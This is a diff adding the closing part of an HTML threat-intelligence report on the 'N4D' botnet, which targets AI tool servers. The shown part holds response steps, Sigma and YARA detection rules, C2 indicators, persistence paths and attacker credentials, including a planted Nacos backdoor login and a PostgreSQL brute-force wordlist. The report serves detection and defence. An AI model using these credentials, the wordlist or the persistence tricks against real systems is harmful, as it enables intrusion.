+  <li>Check <code>/etc/ld.so.preload</code> and user-specific library preload paths for <code>libssh2.so.1.0.1.patched</code> or any unexpected shared library — this custom-compiled SSH development build may function as a backdoor for credential interception via LD_PRELOAD; not confirmed by static analysis alone.</li>
+  <li>Search <code>/dev/shm/</code> for files matching <code>kworker*</code>, <code>.agent.lock</code>, and <code>.agent.pid</code> — the agent binary runs from tmpfs; <code>.agent.lock</code> presence confirms an active instance.</li>
+  <li>Check <code>/tmp/</code> for <code>.n4d*</code> files — temporary exploit scratch files (<code>.n4d_mysql.sh</code>, <code>.n4d_pg.sh</code>, <code>.n4d_redis.sh</code>, <code>.n4d_script.py</code>, <code>.n4d_cred_debug</code>). The last file may contain harvested credentials if the agent crashed mid-exfil.</li>
+  <li>Inspect active network connections for WebSocket upgrades to <code>/api/pty</code> or TLS connections to <code>*.trycloudflare.com</code> — either indicates an active interactive operator session in progress.</li>
+  <li>Block outbound connections to <code>cdnorigin.net</code> and <code>*.trycloudflare.com</code> at the network perimeter to cut off both C2 channels simultaneously.</li>
+</ul>
+
+<h3>Network Detection Signatures — Sigma</h3>
+
+<pre><code><span class="fn">title</span>: <span class="st">N4D Botnet — Direct Connection to Confirmed C2 Server (209.99.186.73)</span>
+<span class="fn">id</span>: <span class="st">7f3a2b91-4d58-4e4c-b82f-1a6c9d5e3f07</span>
+<span class="fn">status</span>: <span class="st">stable</span>
+<span class="fn">description</span>: <span class="st">Outbound connection to 209.99.186.73 — confirmed N4D Mesh Controller C2 server. Open directory exposed at :9090, C2 API at :8443, beacon distribution at :80/:443 (TLS SNI cdnorigin.net).</span>
+<span class="fn">author</span>: <span class="st">1ZRR4H</span>
+<span class="fn">date</span>: <span class="st">2026-07-02</span>
+<span class="fn">logsource</span>:
+  <span class="fn">category</span>: <span class="st">network</span>
+  <span class="fn">product</span>: <span class="st">firewall</span>
+<span class="fn">detection</span>:
+  <span class="fn">selection</span>:
+    <span class="fn">dst_ip</span>: <span class="st">'209.99.186.73'</span>
+  <span class="fn">condition</span>: <span class="st">selection</span>
+<span class="fn">falsepositives</span>:
+  - <span class="st">None expected</span>
+<span class="fn">level</span>: <span class="st">critical</span>
+<span class="fn">tags</span>:
+  - <span class="st">attack.command-and-control</span>
+  - <span class="st">attack.t1071.001</span></code></pre>
+
+<pre><code><span class="fn">title</span>: <span class="st">N4D Botnet — cdnorigin.net C2 Domain DNS Query</span>
+<span class="fn">id</span>: <span class="st">a4b5c6d7-e8f9-4012-abcd-456789012345</span>
+<span class="fn">status</span>: <span class="st">stable</span>
+<span class="fn">description</span>: <span class="st">DNS query for cdnorigin.net — fake CDN domain used by beacon.sh as primary agent download URL. Self-signed RSA-2048 cert issued 2026-06-26, absent from CT logs. Any resolution of this domain means the dropper is executing on that host.</span>
+<span class="fn">author</span>: <span class="st">1ZRR4H</span>
+<span class="fn">date</span>: <span class="st">2026-06-27</span>
+<span class="fn">modified</span>: <span class="st">2026-07-02</span>
+<span class="fn">logsource</span>:
+  <span class="fn">category</span>: <span class="st">dns</span>
+<span class="fn">detection</span>:
+  <span class="fn">selection</span>:
+    <span class="fn">QueryName|endswith</span>: <span class="st">'cdnorigin.net'</span>
+  <span class="fn">condition</span>: <span class="st">selection</span>
+<span class="fn">falsepositives</span>:
+  - <span class="st">None — domain has no legitimate registrant; no CT log entries at time of discovery</span>
+<span class="fn">level</span>: <span class="st">critical</span>
+<span class="fn">tags</span>:
+  - <span class="st">attack.command-and-control</span>
+  - <span class="st">attack.t1071.001</span>
+  - <span class="st">attack.t1584.001</span></code></pre>
+
+<pre><code><span class="fn">title</span>: <span class="st">N4D Agent — Hidden Dot-File Created in /etc/cron.d/</span>
+<span class="fn">id</span>: <span class="st">c6d7e8f9-a0b1-4345-cdef-678901234567</span>
+<span class="fn">status</span>: <span class="st">stable</span>
+<span class="fn">description</span>: <span class="st">File creation with a dot-prefixed name inside /etc/cron.d/. beacon.sh writes /etc/cron.d/.sys-health (2-minute root interval re-launching /dev/shm/kworker*); the Go binary also creates /etc/cron.d/.syscheck. No standard Linux package writes hidden dot-files to this directory.</span>
+<span class="fn">author</span>: <span class="st">1ZRR4H</span>
+<span class="fn">date</span>: <span class="st">2026-06-28</span>
+<span class="fn">modified</span>: <span class="st">2026-07-02</span>
+<span class="fn">logsource</span>:
+  <span class="fn">product</span>: <span class="st">linux</span>
+  <span class="fn">category</span>: <span class="st">file_event</span>
+<span class="fn">detection</span>:
+  <span class="fn">selection</span>:
+    <span class="fn">TargetFilename|startswith</span>: <span class="st">'/etc/cron.d/.'</span>
+  <span class="fn">condition</span>: <span class="st">selection</span>
+<span class="fn">falsepositives</span>:
+  - <span class="st">None — standard software packages do not write dot-files to /etc/cron.d/</span>
+<span class="fn">level</span>: <span class="st">high</span>
+<span class="fn">tags</span>:
+  - <span class="st">attack.persistence</span>
+  - <span class="st">attack.t1053.003</span></code></pre>
+
+<h3>YARA Rules</h3>
+
+<pre><code><span class="kw">rule</span> <span class="fn">N4D_Go_Agent_Binary</span> {
+    <span class="fn">meta</span>:
+        description = <span class="st">"N4D Mesh Controller Go agent — ELF multi-arch botnet with AI exploit arsenal"</span>
+        author      = <span class="st">"1ZRR4H"</span>
+        date        = <span class="st">"2026-07-02"</span>
+        modified    = <span class="st">"2026-07-02"</span>
+        hash_debug  = <span class="st">"3435cc9d4a255bfb4cfb09f2390c29b888f70a43345cfaaecf46c55bc89b814d"</span>
+    <span class="fn">strings</span>:
+        $cred_nacos  = <span class="st">"n4d_admin:n4d_admin123"</span> ascii
+        $fn_lightllm = <span class="st">"deployLightLLM"</span> ascii
+        $fn_ray      = <span class="st">"deployRayDashboard"</span> ascii
+        $mesh_auth   = <span class="st">"X-Mesh-Auth"</span> ascii
+        $devshm_lock = <span class="st">"/dev/shm/.agent.lock"</span> ascii
+        $api_pty     = <span class="st">"/api/pty"</span> ascii
+        $cftunnel    = <span class="st">".trycloudflare.com"</span> ascii
+    <span class="fn">condition</span>:
+        uint32(0) == 0x464C457F and
+        (
+            ($cred_nacos and $devshm_lock) or
+            ($fn_lightllm and $fn_ray) or
+            ($mesh_auth and $api_pty and $cftunnel)
+        )
+}
+
+<span class="kw">rule</span> <span class="fn">N4D_MCP_Scanner</span> {
+    <span class="fn">meta</span>:
+        description = <span class="st">"N4D MCP scanner family — all 4 generations (mcp_scan.py, mcp_direct.py, mcp_scan_v2.py, mcp_v3.py)"</span>
+        author      = <span class="st">"1ZRR4H"</span>
+        date        = <span class="st">"2026-06-27"</span>
+        modified    = <span class="st">"2026-07-02"</span>
+    <span class="fn">strings</span>:
+        $client_id  = <span class="st">"n4d-vps"</span> ascii
+        $tools_list = <span class="st">"tools/list"</span> ascii
+        $danger_key = <span class="st">"execute_command"</span> ascii
+        $proto_ver  = <span class="st">"2024-11-05"</span> ascii
+    <span class="fn">condition</span>:
+        $client_id and 1 of ($tools_list, $danger_key, $proto_ver)
+}
+
+<span class="kw">rule</span> <span class="fn">N4D_Beacon_Script</span> {
+    <span class="fn">meta</span>:
+        description = <span class="st">"N4D dropper beacon.sh — 8-method download chain with cron, bashrc, and systemd persistence"</span>
+        author      = <span class="st">"1ZRR4H"</span>
+        date        = <span class="st">"2026-06-28"</span>
+        modified    = <span class="st">"2026-07-02"</span>
+    <span class="fn">strings</span>:
+        $cdn_front  = <span class="st">"cdnorigin.net"</span> ascii
+        $c2_ip      = <span class="st">"209.99.186.73"</span> ascii
+        $api_binary = <span class="st">"/api/agent/binary"</span> ascii
+        $cron_file  = <span class="st">".sys-health"</span> ascii
+    <span class="fn">condition</span>:
+        ($cdn_front or $c2_ip) and ($api_binary or $cron_file)
+}
+</code></pre>
+
+<h3>Affected ASN Categories</h3>
+
+<div class="tbl-wrap">
+<table>
+  <thead>
+    <tr><th>ASN</th><th>Provider</th><th>Role in Campaign</th></tr>
+  </thead>
+  <tbody>
+    <tr><td class="mono">AS24940</td><td>Hetzner Online</td><td>International agent fleet CIDR pool; primary target for European AI deployments</td></tr>
+    <tr><td class="mono">AS14061</td><td>DigitalOcean</td><td>International agent fleet CIDR pool</td></tr>
+    <tr><td class="mono">AS63949</td><td>Linode / Akamai</td><td>International agent fleet CIDR pool</td></tr>
+    <tr><td class="mono">AS16276</td><td>OVH</td><td>International agent fleet CIDR pool</td></tr>
+    <tr><td class="mono">AS20473</td><td>Vultr</td><td>International agent fleet CIDR pool</td></tr>
+    <tr><td class="mono">AS51167</td><td>Contabo</td><td>International agent fleet CIDR pool</td></tr>
+    <tr><td class="mono">AS45102</td><td>Alibaba Cloud</td><td>Primary scan target (CN geo); also agent fleet</td></tr>
+    <tr><td class="mono">AS132203</td><td>Tencent Cloud</td><td>Primary scan target (CN geo); also agent fleet</td></tr>
+  </tbody>
+</table>
+</div>
+
+<h3>Indicators of Compromise (IOCs)</h3>
+
+<div class="tbl-wrap">
+<table>
+  <thead>
+    <tr><th>Type</th><th>Indicator</th><th>Context</th></tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><span class="pill p-red">SHA256</span></td>
+      <td class="mono" style="font-size:10px;word-break:break-all;">3435cc9d4a255bfb4cfb09f2390c29b888f70a43345cfaaecf46c55bc89b814d</td>
+      <td><code>n4d_debug</code> — Go agent debug build (7.3 MB, ELF64 amd64, Jun 26 2026); complete exploit arsenal with 170+ named functions</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-red">IP</span></td>
+      <td class="mono">209.99.186.73</td>
+      <td>Confirmed C2 server — open directory at :9090, C2 API at :8443, beacon TLS at :443 (SNI: cdnorigin.net), P2P mesh at :9999</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-orange">PORT</span></td>
+      <td class="mono">:8443 (C2), :9999 (P2P)</td>
+      <td>Controller API and inter-agent mesh listener</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-blue">HEADER</span></td>
+      <td class="mono">X-Mesh-Auth: {node_id}:{hmac_sha256}</td>
+      <td>Present on all authenticated agent API calls in v4.0</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-blue">HEADER</span></td>
+      <td class="mono">X-Operator-Key</td>
+      <td>Present on operator-authenticated GET calls to /api/intel, /api/chains, /api/stats</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-blue">PATH</span></td>
+      <td class="mono">/api/register, /api/task/{nid}, /api/result/{nid}, /api/intel, /api/beacon, /api/chains</td>
+      <td>Controller API path family - any of these on port 8443 is C2 traffic</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-orange">UA</span></td>
+      <td class="mono">python-httpx/*</td>
+      <td>Scanner User-Agent (httpx async client)</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-orange">UA</span></td>
+      <td class="mono">Go-http-client/1.1</td>
+      <td>Agent User-Agent (Go HTTP client in n4d_agent binary)</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-dim">JSON</span></td>
+      <td class="mono">"clientInfo": {"name": "n4d-vps", "version": "1.0"}</td>
+      <td>MCP initialize payload - present in every scanner probe</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-red">PROCESS</span></td>
+      <td class="mono">kworker/u*:*</td>
+      <td>Agent process name masquerade matching kernel worker thread format</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-red">FILE</span></td>
+      <td class="mono">/dev/shm/kworker*</td>
+      <td>Agent written to tmpfs to avoid disk writes visible in filesystem forensics</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-red">SSH</span></td>
+      <td class="mono" style="font-size:10px;">authorized_keys backdoor key comments observed: <em>auto-backdoor</em> (21×), <em>test</em> (6×), <em>u0_a599@localhost</em> (3×), <em>admin@mm</em> (2×), <em>hype</em> (2×), <em>jan@mac</em>, <em>root@proxmox</em>, <em>good@gooddeMacBook-Pro.local</em>, <em>evincent@ev-mac.lan</em></td>
+      <td>Attacker-inserted RSA backdoor keys across 21 compromised hosts; "auto-backdoor" is campaign-generated; personal machine hostnames (evincent@ev-mac.lan, jan@mac, good@gooddeMacBook-Pro.local) are low-confidence attribution leads</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-orange">URL</span></td>
+      <td class="mono">GET /api/beacon?arch=&amp;h=&amp;p=</td>
+      <td>Phone-home URL pattern - server-side detection of active compromise in progress</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-orange">DOMAIN</span></td>
+      <td class="mono">cdnorigin.net</td>
+      <td>C2 CDN front domain; TLS SNI on port 443; appears in beacon.sh download URLs and mesh_minimal.py</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-orange">PORT</span></td>
+      <td class="mono">:80, :443</td>
+      <td>Additional C2 entry ports; :80 via http_proxy.py, :443 via tls_proxy.py with cdnorigin.net cert</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-red">FILE</span></td>
+      <td class="mono">/etc/cron.d/.sys-health</td>
+      <td>2-minute root cron entry installed by beacon.sh for persistent agent re-launch</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-red">FILE</span></td>
+      <td class="mono">/tmp/.agent</td>
+      <td>Staging path used by qq_watcher.sh dropper when delivering agent to MCP bot victims</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-red">FILE</span></td>
+      <td class="mono">libssh2.so.1.0.1.patched</td>
+      <td>Custom-compiled SSH library (dev branch, GCC 13.3/Ubuntu 24.04) — possible LD_PRELOAD backdoor for credential interception; no backdoor confirmed by static analysis, but binary does not match any released libssh2 version</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-blue">PATH</span></td>
+      <td class="mono">/api/agent/binary?arch=</td>
+      <td>Agent binary download endpoint - requested by beacon.sh, mesh_minimal.py, and qq_watcher.sh on victim machines</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-blue">PATH</span></td>
+      <td class="mono">/api/pty</td>
+      <td>WebSocket interactive PTY endpoint — operators open live shells on compromised hosts through the C2 web panel; also used by Nginx UI exploit chain on victim side</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-orange">DOMAIN</span></td>
+      <td class="mono">*.trycloudflare.com</td>
+      <td>Cloudflare Quick Tunnel relay; agents call <code>main.startMeshTunnel</code> to establish anonymous outbound C2 channel — TLS signed by Cloudflare CA, no domain registration required</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-red">FILE</span></td>
+      <td class="mono">/etc/profile.d/sys_alias.sh</td>
+      <td>Login-trigger payload written by Nginx UI and Grafana Renderer exploit modules; executes on every interactive login by any user</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-red">FILE</span></td>
+      <td class="mono">/etc/cron.d/.syscheck</td>
+      <td>Secondary cron persistence entry (complement to <code>.sys-health</code>); found as hardcoded path in Go binary</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-red">FILE</span></td>
+      <td class="mono">/dev/shm/.agent.lock, /dev/shm/.agent.pid</td>
+      <td>Singleton lock and PID file in tmpfs; presence indicates an active agent instance; absence after reboot indicates agent survived only in cron/systemd</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-red">FILE</span></td>
+      <td class="mono">/tmp/.n4d, /tmp/.n4d_curl, /tmp/.n4d_mysql.sh, /tmp/.n4d_pg.sh, /tmp/.n4d_redis.sh, /tmp/.n4d_script.py, /tmp/.n4d_cred_debug</td>
+      <td>Scratch files written during exploit execution; <code>.n4d_cred_debug</code> may contain harvested credentials in plaintext if the agent crashed mid-exfil</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-red">CRED</span></td>
+      <td class="mono">n4d_admin:n4d_admin123</td>
+      <td>Backdoor Nacos account credential confirmed by binary analysis (<code>main.deployNacos</code>); submitted via form-urlencoded <code>POST /nacos/v1/auth/login</code> — operators plant this account on first compromise then re-authenticate on return visits</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-red">CRED</span></td>
+      <td class="mono">n4d:n4dmesh2024</td>
+      <td>N4D controller PostgreSQL database user and password hardcoded in controller_v4.py; presence of these credentials on a host confirms the C2 controller itself is deployed there, not just a victim agent</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-red">CRED</span></td>
+      <td class="mono">postgres2024, postgres2025, Postgres@123, postgrespass</td>
+      <td>Hardcoded PostgreSQL brute-force wordlist embedded in binary; any PostgreSQL instance logging failed auth attempts should alert on these values</td>
+    </tr>
+  </tbody>
+</table>
+</div>
+
+</article>
+
+
+<!-- ============================================================ -->
+<!-- SIDEBAR                                                       -->
+<!-- ============================================================ -->
+<aside>
+
+  <div class="sidebar-block">
+    <h4>Navigation</h4>
+    <ol class="toc">
+      <li><a href="#key-findings">00. Key Findings</a></li>
+      <li><a href="#overview">01. Executive Overview</a></li>
+      <li><a href="#infrastructure">02. Infrastructure</a></li>
+      <li><a href="#mcp">03. AI Tooling Target</a></li>
+      <li><a href="#scanning">04. Scanning Ops</a></li>
+      <li><a href="#intel-api">05. OpSec Failure</a></li>
+      <li><a href="#credentials">06. Credential Harvest</a></li>
+      <li><a href="#evolution">07. v3→v4 Hardening</a></li>
+      <li><a href="#chain-engine">08. Chain Engine</a></li>
+      <li><a href="#polymorphic">09. Polymorphic Builder</a></li>
+      <li><a href="#aws">10. AWS Exploitation</a></li>
+      <li><a href="#beacon">11. Dropper &amp; Compromise</a></li>
+      <li><a href="#agent-binary">12. Agent Binary</a></li>
+      <li><a href="#novel">13. 4 Capabilities</a></li>
+      <li><a href="#mitre">14. MITRE ATT&amp;CK</a></li>
+      <li><a href="#detection">15. Detection Guide</a></li>
+    </ol>
+  </div>
+
+
+</aside>
+
+</div>
+</div>
+
+<!-- ====== VALIDATION NOTICE ====== -->
+<section id="validation" style="max-width:1200px;margin:60px auto;padding:0 24px;">
+
+
+</section>
+    </table>
+  </div>
+
+
+
+<!-- ====== FOOTER ====== -->
+<footer>
+  <div class="footer-inner">
+    <div>
+      <div class="footer-body">
+        <strong style="color:var(--dim)">TLP:WHITE - No restrictions. Public release.</strong>
+        All victim IP addresses, password hashes, SSH private keys, AWS access key IDs,
+        AWS secret access keys, AWS session tokens, Azure JWT tokens, and exposed private
+        key material (TLS and Ed25519 update signing keys) have been replaced with [REDACTED]
+        throughout this report. Affected cloud providers have been notified. The campaign was
+        active at time of writing and the current scope is likely larger. Published 2026-06-27,
+        updated 2026-07-02 by 1ZRR4H.
+      </div>
+    </div>
+    <div class="footer-meta">
+      <div>Exposure date: 2026-06-19</div>
+      <div>Report published: 2026-06-27</div>
+      <div>Updated: 2026-07-02</div>
+      <div style="margin-top:12px;font-size:9px;letter-spacing:0.1em;color:var(--mute)">TLP:WHITE - PUBLIC</div>
+    </div>
+  </div>
+</footer>
+
+<script>
+(function() {
+  var navLinks = document.querySelectorAll('.nav-links a[href^="#"]');
+  var tocLinks = document.querySelectorAll('.toc a[href^="#"]');
+  var sections = [];
+
+  navLinks.forEach(function(a) {
+    var id = a.getAttribute('href').slice(1);
+    var el = document.getElementById(id);
+    if (el) sections.push({ id: id, el: el, navA: a });
+  });
+
+  function onScroll() {
+    var scrollY = window.scrollY + 80;
+    var active = null;
+    for (var i = 0; i < sections.length; i++) {
+      if (sections[i].el.getBoundingClientRect().top + window.scrollY <= scrollY) {
+        active = sections[i].id;
+      }
+    }
+    navLinks.forEach(function(a) { a.classList.remove('active'); });
+    tocLinks.forEach(function(a) { a.classList.remove('toc-active'); });
+    if (active) {
+      navLinks.forEach(function(a) {
+        if (a.getAttribute('href') === '#' + active) a.classList.add('active');
+      });
+      tocLinks.forEach(function(a) {
+        if (a.getAttribute('href') === '#' + active) a.classList.add('toc-active');
+      });
+    }
+  }
+
+  window.addEventListener('scroll', onScroll, { passive: true });
+  onScroll();
+})();
+</script>
+
+</body>
+</html>
